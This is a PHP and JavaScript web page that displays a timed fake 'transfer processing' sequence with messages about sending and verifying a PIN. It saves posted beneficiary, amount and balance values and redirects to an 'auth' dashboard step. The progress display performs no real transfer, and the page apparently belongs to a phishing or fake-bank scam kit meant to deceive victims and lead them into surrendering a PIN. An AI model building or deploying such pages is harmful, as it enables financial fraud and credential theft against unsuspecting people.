<script>
var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")
var intervals=1000
//configure destination URL
var targetdestination="dashboard.php?auth4"
var splashmessage=new Array()
var openingtags='<font face="Courier New, Courier, monospace" size="3">'
splashmessage[0]='PROCESSING'
splashmessage[1]=':PLEASE WAIT:'
splashmessage[2]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[3]='INITIATING TRANSFER'
splashmessage[4]='YOUR TRANSFER DATA IS BEING PROCESSED'
splashmessage[5]='10%<BR>OF AUTH COMPLETED<br>'
splashmessage[6]='15%<BR>OF SENDING PIN<br>'
splashmessage[7]='20%<BR>OF VERIFYING PIN<br>'
splashmessage[8]='21%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[9]='25%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[10]='30%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[11]='40%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[12]='42%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[13]='45%<BR>OF TRANSFER COMPLETED<br>'
splashmessage[14]='100%<BR>OF PIN REQUEST GRANTED<br>'
var closingtags='</font>'
//Do not edit below this line (besides HTML code at the very bottom)
var i=0
var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()
//preload images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}
function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}
function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
sc_ns.document.close()
sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2
sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}
function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer
  </script>
  <script><!--
var jv=1.0;
//--></script>
  <script language="Javascript1.1"><!--
jv=1.1;
//--></script>
  <script language="Javascript1.2"><!--
jv=1.2;
//--></script>
  <script language="Javascript1.3"><!--
jv=1.3;
//--></script>
  <script language="Javascript1.4"><!--
jv=1.4;
//--></script>
<br>
<br>

<?php if(isset($_POST['beneficiary'])){
$_SESSION['bn']=$_POST['beneficiary'];
$_SESSION['am']=$_POST['amount'];
$_SESSION['bl']=$_POST['balance'];
}
?>

<div id="Layer1" style='background:white;'>

<div class="style4">
<h2><small>&nbsp; <span
 style="color: rgb(0, 153, 0);">&nbsp;<span
 style="font-family: Arial Black;">Transfer is
processing......</span></span></small><br>
</h2>
</div>
<div class="style1" id="splashcontainer" align="center"></div>
<div>
<p class="style1" align="center"><br>
<br>
<br>
<br>
<img alt=""
 style="top: 320px; height: 150px; left: 612px; width: 320px;"
 src="loading2.gif"></p>
</div>
</div>
<span class="style1"><font size="18">
</font></span><span class="style1"> </span>
<noscript><span class="style1"><IMG height=1 src="#"
width=1></span>
</noscript>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1">&nbsp;</p>
<p class="style1" align="center">&nbsp;</p>
<p class="style1" align="center">&nbsp;</p>
<p class="style1" align="center">&nbsp;</p>
<p class="style1" align="center">&nbsp;</p>
